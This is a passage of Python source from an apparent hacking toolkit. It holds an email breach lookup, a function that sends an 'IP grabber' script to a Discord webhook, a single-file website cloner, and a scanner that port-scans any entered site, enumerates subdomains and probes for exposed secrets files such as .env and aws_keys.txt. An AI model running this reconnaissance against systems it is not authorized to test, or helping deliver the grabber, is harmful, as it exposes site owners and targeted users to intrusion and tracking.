                    print(f"{RED}⚠ [BREACH FOUND] HaveIBeenPwned - {len(breaches)} incident(s):{RESET}")
                    for breach in breaches[:10]:
                        breach_date = breach.get('BreachDate', 'Unknown')
                        breach_name = breach.get('Name', 'Unknown')
                        data_classes = breach.get('DataClasses', [])
                        print(f"  {RED}• {breach_name}{RESET} ({breach_date})")
                        if data_classes:
                            print(f"    {YELLOW}Exposed: {', '.join(data_classes[:4])}{RESET}")
                        breach_details.append(f"HIBP: {breach_name}")
                    breach_found = True
                else:
                    print(f"{GREEN}✓ [SAFE] Not found in HaveIBeenPwned{RESET}")
            except:
                sys.stdout.write(f"\r{' ' * 80}\r")
                sys.stdout.flush()
                print(f"{YELLOW}⚠ HIBP response parsing issue{RESET}")
        elif response.status_code == 404:
            sys.stdout.write(f"\r{' ' * 80}\r")
            sys.stdout.flush()
            print(f"{GREEN}✓ [SAFE] Not found in HaveIBeenPwned{RESET}")
        else:
            sys.stdout.write(f"\r{' ' * 80}\r")
            sys.stdout.flush()
            print(f"{YELLOW}⚠ HIBP API Status: {response.status_code}{RESET}")
    except Exception as e:
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()
        print(f"{YELLOW}⚠ HIBP lookup error{RESET}")
    
    # *** Method 2: EmailRep.io ***
    try:
        sys.stdout.write(f"{YELLOW}[2/5] Checking EmailRep.io Database...{RESET}")
        sys.stdout.flush()
        
        response = requests.get(f"https://emailrep.io/{email}", timeout=10, verify=False)
        
        if response.status_code == 200:
            try:
                data = response.json()
                sys.stdout.write(f"\r{' ' * 80}\r")
                sys.stdout.flush()
                
                reputation = data.get('reputation', 'unknown')
                compromised = data.get('compromised', False)
                suspicious = data.get('suspicious', False)
                
                if reputation == 'malicious':
                    print(f"{RED}⚠ [WARNING] EmailRep - Reputation: MALICIOUS{RESET}")
                    breach_found = True
                    breach_details.append("EmailRep: Malicious Reputation")
                elif reputation == 'suspicious':
                    print(f"{YELLOW}⚠ EmailRep - Reputation: SUSPICIOUS{RESET}")
                else:
                    print(f"{GREEN}✓ EmailRep - Reputation: {reputation.upper()}{RESET}")
                
                if compromised:
                    print(f"{RED}⚠ [BREACH FOUND] EmailRep - Status: COMPROMISED{RESET}")
                    breach_found = True
                    breach_details.append("EmailRep: Compromised")
                
                if suspicious:
                    print(f"{YELLOW}⚠ EmailRep - Suspicious Activity Detected{RESET}")
            except:
                sys.stdout.write(f"\r{' ' * 80}\r")
                sys.stdout.flush()
                print(f"{YELLOW}⚠ EmailRep parsing failed{RESET}")
        else:
            sys.stdout.write(f"\r{' ' * 80}\r")
            sys.stdout.flush()
    except Exception as e:
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()
    
    # *** Method 3: HackerTarget Leak Check ***
    try:
        sys.stdout.write(f"{YELLOW}[3/5] Checking HackerTarget LeakCheck...{RESET}")
        sys.stdout.flush()
        
        response = requests.get(
            f"https://api.hackertarget.com/leakcheck/?email={email}",
            timeout=10,
            verify=False
        )
        
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()
        
        if response.status_code == 200:
            if 'No leaks found' not in response.text and response.text.strip():
                print(f"{RED}⚠ [BREACH FOUND] HackerTarget - Compromises detected:{RESET}")
                lines = response.text.strip().split('\n')
                for line in lines[:8]:
                    if line.strip():
                        print(f"  {RED}• {line.strip()}{RESET}")
                breach_found = True
                breach_details.append("HackerTarget: Compromise detected")
            else:
                print(f"{GREEN}✓ [SAFE] No compromises in HackerTarget{RESET}")
        else:
            print(f"{YELLOW}⚠ HackerTarget status: {response.status_code}{RESET}")
    except:
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()
        print(f"{YELLOW}⚠ HackerTarget lookup failed{RESET}")
    
    # *** Method 4: Rapid7 Sonarss ***
    try:
        sys.stdout.write(f"{YELLOW}[4/5] Checking Rapid7 Sonarss Database...{RESET}")
        sys.stdout.flush()
        
        response = requests.get(
            f"https://sonarss.rapid7.com/?email={email}",
            timeout=10,
            verify=False,
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()
        
        if response.status_code == 200 and len(response.text) > 100:
            print(f"{RED}⚠ [BREACH FOUND] Rapid7 Sonarss - Email in database{RESET}")
            breach_found = True
            breach_details.append("Rapid7: Found in Sonarss database")
        else:
            print(f"{GREEN}✓ [SAFE] Not in Rapid7 Sonarss{RESET}")
    except:
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()
        print(f"{YELLOW}⚠ Rapid7 lookup unavailable{RESET}")
    
    # *** Method 5: Google Search Index Check ***
    try:
        sys.stdout.write(f"{YELLOW}[5/5] Checking Public Exposure (Google)...{RESET}")
        sys.stdout.flush()
        
        response = requests.get(
            f"https://www.google.com/search?q=\"{email}\"",
            timeout=10,
            verify=False,
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()
        
        if response.status_code == 200 and 'About' in response.text:
            print(f"{YELLOW}⚠ Email found in Google search results (publicly exposed){RESET}")
        else:
            print(f"{GREEN}✓ [SAFE] Email not widely indexed{RESET}")
    except:
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()
    
    # Search on WHOIS
    print(f"\n{BOLD}{YELLOW}[*] Domain WHOIS & Registration Check:{RESET}")
    try:
        sys.stdout.write(f"{YELLOW}[-] Checking WHOIS Registry...{RESET}")
        sys.stdout.flush()
        
        whois_url = f"https://whois.whoisxmlapi.com/api/v1/whois?domain={email_domain_lower}&apiKey=at_freeapi"
        response = requests.get(whois_url, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            registrar = data.get('WhoisRecord', {}).get('registrarName', 'Unknown')
            sys.stdout.write(f"\r{' ' * 80}\r")
            sys.stdout.flush()
            print(f"{GREEN}✓ Domain Registrar: {CYAN}{registrar}{RESET}")
    except:
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()
    
    # Manual search links
    print(f"\n{BOLD}{YELLOW}[*] Manual Search Links (Copy & Paste):{RESET}")
    search_urls = {
        "Google": f"https://www.google.com/search?q=\"{email}\"",
        "Bing": f"https://www.bing.com/search?q=\"{email}\"",
        "DuckDuckGo": f"https://duckduckgo.com/?q=\"{email}\"",
        "GitHub": f"https://github.com/search?type=users&q={email}",
        "Shodan": f"https://shodan.io/search?query={email}",
        "Pastebin": f"https://pastebin.com/search?q={email}",
    }
    
    for service, url in search_urls.items():
        print(f"{CYAN}{service:15} {PURPLE}{url}{RESET}")
    
    # ====== RESULTS SUMMARY ======
    print(f"\n{BOLD}{CYAN}═══════════════════════════════════════{RESET}")
    print(f"{BOLD}{RED}SECURITY ASSESSMENT REPORT{RESET}")
    print(f"{BOLD}{CYAN}═══════════════════════════════════════{RESET}")
    
    if found_count > 0:
        print(f"\n{BOLD}{YELLOW}Account Registrations: {found_count} platform(s){RESET}")
        for platform, _, is_found in registered_accounts:
            if is_found == True:
                print(f"  {GREEN}✓ {platform}{RESET}")
    
    if breach_found:
        print(f"\n{BOLD}{RED}╔════════════════════════════════════════╗{RESET}")
        print(f"{BOLD}{RED}║ ⚠  CRITICAL: EMAIL HAS BEEN BREACHED  ║{RESET}")
        print(f"{BOLD}{RED}╚════════════════════════════════════════╝{RESET}")
        print(f"\n{BOLD}{RED}Breaches Found ({len(breach_details)}):{RESET}")
        for detail in breach_details:
            print(f"  {RED}✗ {detail}{RESET}")
        print(f"\n{BOLD}{YELLOW}⚠ IMMEDIATE ACTIONS REQUIRED:{RESET}")
        print(f"  {RED}1. Change your password IMMEDIATELY{RESET}")
        print(f"  {RED}2. Enable 2FA on all accounts{RESET}")
        print(f"  {RED}3. Monitor credit & financial accounts{RESET}")
        print(f"  {RED}4. Check breach details at haveibeenpwned.com{RESET}")
        print(f"  {RED}5. Consider password manager & data freeze{RESET}")
    else:
        print(f"\n{BOLD}{GREEN}✓ No major breaches detected in monitored databases{RESET}")
        print(f"{YELLOW}Note: This check monitors known breaches only.{RESET}")
        print(f"{YELLOW}Stay vigilant and monitor your accounts.{RESET}")
    
    print(f"{BOLD}{CYAN}═══════════════════════════════════════{RESET}")

def ip_grabber_discord_tool():
    clear()
    grabber_ascii_art()
    print(f"{BOLD}{CYAN}== Send SHHHHH.py Script to Discord Webhook =={RESET}")
    webhook = input("Enter the Discord Webhook URL: ").strip()
    webhook_name = input("Enter the webhook name (display name for the sender): ").strip()
    if not webhook_name:
        webhook_name = "Script Sender"
    
    script_path = os.path.join(os.path.dirname(__file__), "SHHHHH.py")
    
    if not os.path.exists(script_path):
        print(f"{RED}Error: SHHHHH.py not found at {script_path}{RESET}")
        return
    
    try:
        with open(script_path, "rb") as f:
            files = {"file": ("SHHHHH.py", f, "text/x-python")}
            data = {"username": webhook_name}
            response = requests.post(webhook, files=files, data=data)
            if response.status_code in (200, 204):
                print(f"{GREEN}Script successfully sent to webhook!{RESET}")
            else:
                print(f"{RED}Error sending to webhook: {response.status_code} - {response.text}{RESET}")
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

def base64_converter_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Base64 Encoder/Decoder =={RESET}")
    choice = input("Choose (1) Encode or (2) Decode: ").strip()
    
    if choice == "1":
        text = input("Enter text to encode: ").strip()
        encoded = __import__('base64').b64encode(text.encode()).decode()
        print(f"{GREEN}Encoded: {RESET}{encoded}")
    elif choice == "2":
        text = input("Enter base64 text to decode: ").strip()
        try:
            decoded = __import__('base64').b64decode(text).decode()
            print(f"{GREEN}Decoded: {RESET}{decoded}")
        except:
            print(f"{RED}Invalid base64 string!{RESET}")


def download_file(url, headers, timeout=10):
    """Download file and return (content, mime)"""
    try:
        r = requests.get(url, headers=headers, timeout=timeout, verify=True, allow_redirects=True)
        if r.status_code == 200:
            mime = r.headers.get('content-type', 'application/octet-stream').split(';')[0].strip()
            return r.content, mime
    except:
        pass
    return None, None

def to_datauri(url, base_url, headers):
    """Convert file URL to data URI"""
    try:
        if url.startswith(('http://', 'https://')):
            full = url
        else:
            full = urljoin(base_url, url)
        content, mime = download_file(full, headers)
        if content:
            b64 = __import__('base64').b64encode(content).decode('ascii')
            return f'data:{mime};base64,{b64}'
    except:
        pass
    return None

def website_cloner_tool():
    """Website Cloner - Full site extraction to standalone HTML"""
    
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Website Cloner == note: this tools is still in development, expect bugs and incomplete features.{RESET}\n")
    
    url = input(f"{CYAN}Enter website URL: {RESET}").strip()
    if not url:
        print(f"{RED}✗ URL cannot be empty!{RESET}")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    print(f"\n{BOLD}{YELLOW}[*] Target: {url}{RESET}")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    # 1. Fetch HTML
    print(f"{YELLOW}[1] Fetching HTML...{RESET}")
    try:
        r = requests.get(url, headers=headers, timeout=20, verify=True)
        if r.status_code != 200:
            print(f"{RED}ERROR: HTTP {r.status_code}{RESET}")
            return
        html = r.text
    except Exception as e:
        print(f"{RED}ERROR: {e}{RESET}")
        return
    
    stats = {'css': 0, 'img': 0, 'js': 0, 'font': 0}
    
    # 2. Inline CSS from <link> tags
    print(f"{YELLOW}[2] Embedding stylesheets...{RESET}")
    for match in re.finditer(r'<link[^>]+rel=["\']?stylesheet["\']?[^>]*href=["\']([^"\']+)["\']', html, re.I):
        css_url = match.group(1)
        css_content, _ = download_file(urljoin(url, css_url), headers, timeout=12)
        if css_content:
            css_text = css_content.decode('utf-8', errors='replace')
            
            # Inline all resource URLs in CSS
            for url_match in re.finditer(r'url\(["\']?([^"\')\s;]+)["\']?\)', css_text):
                res_url = url_match.group(1)
                data_uri = to_datauri(res_url, url, headers)
                if data_uri:
                    css_text = css_text.replace(url_match.group(0), f'url({data_uri})')
                    stats['font'] += 1
            
            style_tag = f'<style>{css_text}</style>'
            html = html.replace(match.group(0), style_tag)
            stats['css'] += 1
    
    # 3. Inline images
    print(f"{YELLOW}[3] Embedding images...{RESET}")
    for match in re.finditer(r'<img[^>]*\ssrc=["\']([^"\']+)["\']', html, re.I):
        img_url = match.group(1)
        data_uri = to_datauri(img_url, url, headers)
        if data_uri:
            old = match.group(0)
            new = old.replace(f'src="{img_url}"', f'src="{data_uri}"').replace(f"src='{img_url}'", f"src='{data_uri}'")
            html = html.replace(old, new, 1)
            stats['img'] += 1
    
    # 4. Inline scripts
    print(f"{YELLOW}[4] Embedding scripts...{RESET}")
    for match in re.finditer(r'<script[^>]*\ssrc=["\']([^"\']+)["\'][^>]*>\s*</script>', html, re.I):
        js_url = match.group(1)
        if not js_url.startswith('data:'):
            js_content, _ = download_file(urljoin(url, js_url), headers, timeout=12)
            if js_content:
                js_code = js_content.decode('utf-8', errors='replace')[:100000]
                old = match.group(0)
                new = old.replace(f'src="{js_url}"', '').replace(f"src='{js_url}'", '')
                new = new.replace('></script>', f'>{js_code}</script>')
                html = html.replace(old, new)
                stats['js'] += 1
    
    # 5. Write output
    print(f"{YELLOW}[5] Writing output...{RESET}")
    title_match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.I)
    title = title_match.group(1).strip()[:50] if title_match else "Website"
    safe_name = "".join(c if c.isalnum() or c == ' ' else '_' for c in title).strip()
    if not safe_name:
        safe_name = "Website"
    
    output_dir = os.path.dirname(os.path.abspath(__file__))
    output_file = os.path.join(output_dir, 'output', f"{safe_name}.html")
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    
    with open(output_file, 'w', encoding='utf-8', errors='replace') as f:
        f.write(html)
    
    size_mb = os.path.getsize(output_file) / (1024 * 1024)
    
    print(f"\n{GREEN}Done.{RESET}")
    print(f"  Stylesheets: {stats['css']} | Images: {stats['img']} | Scripts: {stats['js']} | Resources: {stats['font']}")
    print(f"  Size: {size_mb:.1f} MB")
    print(f"  Location: {output_file}\n")


# Alias for menu
website_copier_tool = website_cloner_tool


def website_info_scanner_menu():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== ADVANCED WEBSITE INTELLIGENCE SCANNER == note: this tools is still in development, expect bugs and incomplete features.{RESET}")
    print(f"{CYAN}▶ Enter website URL (with http/https): {RESET}", end='', flush=True)
    url = input().strip()
    
    import dns.resolver
    import dns.reversename
    import whois
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    parsed_url = urlparse(url)
    domain = parsed_url.netloc.replace('www.', '')
    
    if not domain:
        print(f"{RED}✗ Error: Invalid URL{RESET}")
        return
    
    print(f"\n{BOLD}{CYAN}╔════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}║         COMPREHENSIVE WEBSITE INTELLIGENCE         ║{RESET}")
    print(f"{BOLD}{CYAN}╚════════════════════════════════════════════════════╝{RESET}\n")
    
    issues = []
    ips = []
    ports_open = []
    data = {}
    
    try:
        # 1. WHOIS LOOKUP - EXTENDED
        print(f"{BOLD}{YELLOW}[1/12] WHOIS Information & Domain Details...{RESET}")
        try:
            w = whois.whois(domain)
            print(f"{GREEN}✓{RESET} Registrar: {CYAN}{w.registrar}{RESET}")
            print(f"{GREEN}✓{RESET} Registrant: {CYAN}{str(w.registrant_name)[:80] if w.registrant_name else 'Private'}{RESET}")
            if w.creation_date:
                print(f"{GREEN}✓{RESET} Created: {CYAN}{w.creation_date}{RESET}")
            if w.expiration_date:
                print(f"{GREEN}✓{RESET} Expires: {CYAN}{w.expiration_date}{RESET}")
            if w.updated_date:
                print(f"{GREEN}✓{RESET} Last Update: {CYAN}{w.updated_date}{RESET}")
            if w.emails:
                emails_str = ', '.join(w.emails[:3])
                print(f"{RED}⚠{RESET}  Admin Emails: {CYAN}{emails_str}{RESET}")
                issues.append(f"Admin emails publicly listed: {emails_str}")
            if w.name_servers:
                print(f"{GREEN}✓{RESET} Nameservers: {CYAN}{', '.join(str(ns) for ns in w.name_servers[:3])}{RESET}")
            data['whois'] = w
        except Exception as e:
            print(f"{YELLOW}○{RESET} WHOIS unavailable")
        
        # 2. DNS RESOLUTION + REVERSE DNS + ASN INFO
        print(f"\n{BOLD}{YELLOW}[2/12] DNS Resolution, Reverse Lookup & ASN Info...{RESET}")
        try:
            for rtype in ['A', 'AAAA']:
                try:
                    answers = dns.resolver.resolve(domain, rtype)
                    for rdata in answers:
                        ip = str(rdata)
                        ips.append(ip)
                        print(f"{GREEN}✓{RESET} {rtype}: {CYAN}{ip}{RESET}")
                        
                        # Get ASN and ISP info
                        try:
                            asn_info = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
                            if 'org' in asn_info:
                                org = asn_info['org']
                                print(f"  ├─ ISP/Org: {CYAN}{org}{RESET}")
                                issues.append(f"Hosting: {org}")
                            if 'hostname' in asn_info:
                                print(f"  ├─ Hostname: {CYAN}{asn_info['hostname']}{RESET}")
                            print(f"  ├─ Country: {CYAN}{asn_info.get('country', 'N/A')}{RESET}")
                            print(f"  ├─ City: {CYAN}{asn_info.get('city', 'N/A')}{RESET}")
                            print(f"  └─ Coordinates: {CYAN}{asn_info.get('loc', 'N/A')}{RESET}")
                        except:
                            pass
                        
                        try:
                            rev = dns.resolver.resolve(dns.reversename.from_address(ip), "PTR")[0]
                            print(f"  └─ PTR: {CYAN}{str(rev)}{RESET}")
                        except:
                            print(f"  └─ PTR: {YELLOW}No reverse DNS{RESET}")
                except:
                    pass
        except Exception as e:
            print(f"{RED}✗ DNS failed: {e}{RESET}")
        
        # 3. ALL DNS RECORDS ENUMERATION
        print(f"\n{BOLD}{YELLOW}[3/12] DNS Records Enumeration...{RESET}")
        for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                for rdata in answers:
                    val = str(rdata)[:90]
                    print(f"{GREEN}✓{RESET} {rtype}: {CYAN}{val}{RESET}")
                    if rtype == 'MX':
                        issues.append(f"Mail server found: {val}")
            except:
                pass
        
        # 4. CERTIFICATE TRANSPARENCY - GET CERTIFICATE INFO
        print(f"\n{BOLD}{YELLOW}[4/12] Certificate Transparency & SSL Info...{RESET}")
        try:
            # Query crt.sh for certificates
            crt_url = f"https://crt.sh/?q={domain}&output=json"
            certs = requests.get(crt_url, timeout=5).json()
            if isinstance(certs, list) and len(certs) > 0:
                print(f"{GREEN}✓{RESET} Found {len(certs)} certificate(s)")
                for cert in certs[:5]:
                    if 'name_value' in cert:
                        names = cert['name_value'].split('\n')
                        print(f"  ├─ Names: {CYAN}{', '.join(names[:2])}{RESET}")
                    if 'entry_timestamp' in cert:
                        print(f"  └─ Timestamp: {CYAN}{cert['entry_timestamp']}{RESET}")
                        issues.append(f"Certificate found: {cert.get('name_value', 'N/A')[:50]}")
        except:
            pass
        
        # 5. GEO-IP LOOKUP (using ipinfo.io)
        print(f"\n{BOLD}{YELLOW}[5/12] Detailed GeoIP & Threat Intelligence...{RESET}")
        if ips:
            try:
                ip_info = requests.get(f"https://ipinfo.io/{ips[0]}/json", timeout=5).json()
                print(f"{GREEN}✓{RESET} Location: {CYAN}{ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')}{RESET}")
                print(f"{GREEN}✓{RESET} ISP/Organization: {CYAN}{ip_info.get('org', 'N/A')}{RESET}")
                print(f"{GREEN}✓{RESET} Coordinates: {CYAN}{ip_info.get('loc', 'N/A')}{RESET}")
                print(f"{GREEN}✓{RESET} Timezone: {CYAN}{ip_info.get('timezone', 'N/A')}{RESET}")
                if 'hostname' in ip_info:
                    print(f"{GREEN}✓{RESET} Hostname: {CYAN}{ip_info['hostname']}{RESET}")
                
                # Check abuse/threats
                try:
                    abuse_check = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ips[0]}&maxAgeInDays=90", 
                                             headers={'Key': 'dummy', 'Accept': 'application/json'}, timeout=5).json()
                    if 'abuseConfidenceScore' in abuse_check:
                        score = abuse_check['abuseConfidenceScore']
                        if score > 50:
                            print(f"{RED}⚠{RESET}  Abuse Score: {CYAN}{score}%{RESET}")
                            issues.append(f"IP has abuse history: {score}%")
                except:
                    pass
                    
            except:
                print(f"{YELLOW}○{RESET} GeoIP lookup failed")
        
        # 6. PORT SCANNING (PARALLEL)
        print(f"\n{BOLD}{YELLOW}[6/12] Port Scanning (All Common Ports)...{RESET}")
        common_ports = {20: 'FTP-DATA', 21: 'FTP', 22: 'SSH', 23: 'TELNET', 25: 'SMTP', 53: 'DNS',
                       80: 'HTTP', 110: 'POP3', 143: 'IMAP', 161: 'SNMP', 389: 'LDAP', 443: 'HTTPS',
                       445: 'SMB', 465: 'SMTPS', 514: 'SYSLOG', 587: 'SMTP', 636: 'LDAPS', 993: 'IMAPS',
                       995: 'POP3S', 1433: 'MSSQL', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
                       5900: 'VNC', 6379: 'Redis', 8080: 'Alt-HTTP', 8443: 'Alt-HTTPS', 27017: 'MongoDB',
                       9200: 'Elasticsearch', 9300: 'ES-Cluster', 5000: 'Flask', 8888: 'Jupyter',
                       9000: 'SonarQube', 4444: 'Selenium', 5050: 'ServiceNow', 8000: 'Dev-Server'}
        
        def scan_port(host, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((host, port))
                sock.close()
                if result == 0:
                    return port
            except:
                pass
            return None
        
        target_ip = ips[0] if ips else domain
        ports_count = 0
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(scan_port, target_ip, p) for p in common_ports.keys()]
            for future in futures:
                try:
                    port = future.result(timeout=2)
                    if port:
                        service = common_ports.get(port, 'Unknown')
                        print(f"{RED}⚠{RESET}  Port {CYAN}{port}/{service}{RESET} OPEN")
                        ports_open.append(port)
                        issues.append(f"Port {port} ({service}) OPEN")
                        ports_count += 1
                except:
                    pass
        
        if ports_count == 0:
            print(f"{YELLOW}○{RESET} No common ports open")
        
        # 7. HTTP HEADERS & SERVER FINGERPRINTING
        print(f"\n{BOLD}{YELLOW}[7/12] HTTP Headers & Server Fingerprinting...{RESET}")
        try:
            resp = requests.get(url, timeout=8, verify=False, allow_redirects=True)
            print(f"{GREEN}✓{RESET} Status: {CYAN}{resp.status_code}{RESET}")
            print(f"{GREEN}✓{RESET} Content Size: {CYAN}{len(resp.content)} bytes{RESET}")
            print(f"{GREEN}✓{RESET} Content Type: {CYAN}{resp.headers.get('Content-Type', 'N/A')}{RESET}")
            
            server = resp.headers.get('Server', 'Hidden')
            powered_by = resp.headers.get('X-Powered-By', 'N/A')
            print(f"{GREEN}✓{RESET} Server: {CYAN}{server}{RESET}")
            if powered_by != 'N/A':
                print(f"{GREEN}✓{RESET} Powered By: {CYAN}{powered_by}{RESET}")
            
            if server == 'Hidden':
                print(f"{YELLOW}→{RESET} Server banner hidden (Good)")
            elif 'Apache' in server or 'nginx' in server:
                issues.append(f"Server version publicly exposed: {server}")
            
            # Check security headers
            security_headers = {
                'X-Frame-Options': 'Clickjacking',
                'X-Content-Type-Options': 'MIME Sniffing',
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'XSS/Injection',
                'X-XSS-Protection': 'XSS'
            }
            missing = [h for h in security_headers if h not in resp.headers]
            
            if missing:
                for h in missing:
                    issues.append(f"Missing security header: {h} ({security_headers[h]})")
                    print(f"{RED}✗{RESET} Missing: {h}")
            else:
                print(f"{GREEN}✓{RESET} All security headers present")
        except Exception as e:
            issues.append(f"HTTP error: {type(e).__name__}")
        
        # 8. SSL/TLS CERTIFICATE ANALYSIS
        print(f"\n{BOLD}{YELLOW}[8/12] SSL/TLS Certificate Analysis...{RESET}")
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    cert_bin = ssock.getpeercert(binary_form=True)
                    protocol = ssock.version()
                    cipher = ssock.cipher()
                    
                    # Extract details
                    subject = dict(x[0] for x in cert['subject'])
                    issuer = dict(x[0] for x in cert['issuer'])
                    
                    print(f"{GREEN}✓{RESET} Protocol: {CYAN}{protocol}{RESET}")
                    if cipher:
                        print(f"{GREEN}✓{RESET} Cipher: {CYAN}{cipher[0]}{RESET}")
                    print(f"{GREEN}✓{RESET} Certificate CN: {CYAN}{subject.get('commonName', 'N/A')}{RESET}")
                    print(f"{GREEN}✓{RESET} Issuer: {CYAN}{issuer.get('commonName', 'N/A')}{RESET}")
                    print(f"{GREEN}✓{RESET} Valid: {CYAN}{cert['notBefore']} to {cert['notAfter']}{RESET}")
                    
                    # Check for self-signed
                    if subject == issuer:
                        issues.append("Self-signed certificate detected")
                        print(f"{RED}⚠{RESET}  Self-signed certificate!")
        except Exception as e:
            issues.append(f"SSL error: {str(e)[:50]}")
            print(f"{YELLOW}○{RESET} SSL error: {str(e)[:50]}")
        
        # 9. TECHNOLOGY FINGERPRINTING + CMS DETECTION
        print(f"\n{BOLD}{YELLOW}[9/12] Technology Stack & CMS Detection...{RESET}")
        try:
            resp = requests.get(url, timeout=8, verify=False)
            body = resp.text.lower()
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            
            techs = {
                'WordPress': ['wp-content', 'wordpress', 'wp-json', 'wp-includes', 'wp-admin'],
                'Drupal': ['drupal', '/sites/default', 'drupal.js'],
                'Joomla': ['joomla', 'component/com_', 'administrator/index.php'],
                'Django': ['django', 'csrf'],
                'Flask': ['flask', 'werkzeug'],
                'ASP.NET': ['asp.net', 'webforms', '.aspx', 'aspnet_sessionid'],
                'PHP': ['php', 'php.ini', '.php'],
                'Node.js': ['express', 'node.js', 'nodejs'],
                'React': ['react', '_react', 'react-root', 'react_root'],
                'Vue': ['vue', '__vue__', 'v-app'],
                'Angular': ['angular', 'ng-app', 'angularjs', 'ng-version'],
                'jQuery': ['jquery', '$jquery'],
                'Bootstrap': ['bootstrap', 'bootstrap.css'],
                'Nginx': ['nginx'],
                'Apache': ['apache']
            }
            
            for tech, sigs in techs.items():
                if any(sig in body for sig in sigs):
                    print(f"{CYAN}→{RESET} {tech} detected")
                    issues.append(f"Technology: {tech}")
        except:
            pass
        
        # 10. SUBDOMAIN ENUMERATION
        print(f"\n{BOLD}{YELLOW}[10/12] Subdomain Discovery...{RESET}")
        subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'test', 'staging', 'dev', 'beta', 
                     'demo', 'shop', 'blog', 'cdn', 'images', 'assets', 'backup', 'db', 'mail2',
                     'vpn', 'ssh', 'git', 'jenkins', 'grafana', 'kibana', 'splunk', 'api-v1',
                     'api-v2', 'docs', 'app', 'panel', 'control', 'host', 'server', 'web',
                     'smtp', 'pop', 'imap', 'ns1', 'ns2', 'mx1', 'support', 'help', 'forum']
        
        def test_subdomain(sub):
            try:
                result = dns.resolver.resolve(f"{sub}.{domain}", 'A', lifetime=2)
                return f"{sub}:{str(result[0])}"
            except:
                pass
            return None
        
        subs_found = []
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = [executor.submit(test_subdomain, s) for s in subdomains]
            for future in futures:
                try:
                    result = future.result(timeout=3)
                    if result:
                        subs_found.append(result)
                except:
                    pass
        
        if subs_found:
            for sub in subs_found:
                print(f"{GREEN}✓{RESET} {CYAN}{sub}{RESET}")
                issues.append(f"Subdomain: {sub}")
        else:
            print(f"{YELLOW}○{RESET} No subdomains found")
        
        # 11. DIRECTORY & BACKUP FILE DETECTION
        print(f"\n{BOLD}{YELLOW}[11/12] Backup & Configuration File Detection...{RESET}")
        dangerous_files = [
            '.env', '.env.local', '.env.prod', '.git/config', '.gitconfig', 'web.config', 
            'wp-config.php', '.htaccess', 'database.yml', 'backup.zip', 'backup.tar',
            'config.php', 'robots.txt', 'aws_keys.txt', '.env.production', 'secrets.json',
            '.hg', '.svn', 'composer.lock', 'package-lock.json', 'Gemfile.lock', 'requirements.txt',
            '.DS_Store', 'thumbs.db', '.vscode/settings.json', 'docker-compose.yml',
            '.github/workflows', 'Dockerfile', '.gitlab-ci.yml', '.travis.yml', 'build.xml',
            'pom.xml', 'gradle.build', 'webpack.config.js', '.babelrc', '.eslintrc', '.prettierrc'
        ]
        
        def check_file(path):
            try:
                r = requests.head(f"{url.rstrip('/')}/{path}", timeout=1, verify=False, allow_redirects=False)
                if r.status_code in [200, 403]:
                    return path
            except:
                pass
            return None
        
        files_found = 0
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_file, f) for f in dangerous_files]
            for future in futures:
                try:
                    result = future.result(timeout=2)
                    if result:
                        issues.append(f"Exposed file: /{result}")
                        print(f"{RED}⚠{RESET} Found: /{result}")
                        files_found += 1
                except:
                    pass
        
        if files_found == 0:
            print(f"{YELLOW}○{RESET} No sensitive files found")
        
        # 12. FINAL REPORT
        print(f"\n{BOLD}{CYAN}╔════════════════════════════════════════════════════╗{RESET}")
        print(f"{BOLD}{CYAN}║              INTELLIGENCE REPORT                   ║{RESET}")
        print(f"{BOLD}{CYAN}╚════════════════════════════════════════════════════╝{RESET}\n")
        
        print(f"{BOLD}URL:{RESET} {CYAN}{url}{RESET}")
        print(f"{BOLD}Domain:{RESET} {CYAN}{domain}{RESET}")
        print(f"{BOLD}IP Addresses:{RESET} {CYAN}{', '.join(ips) if ips else 'None'}{RESET}")
        print(f"{BOLD}Open Ports:{RESET} {CYAN}{len(ports_open)} found: {ports_open}{RESET}\n")
        
        if issues:
            print(f"{RED}FINDINGS ({len(issues)}):{RESET}")
            for i, issue in enumerate(issues[:50], 1):
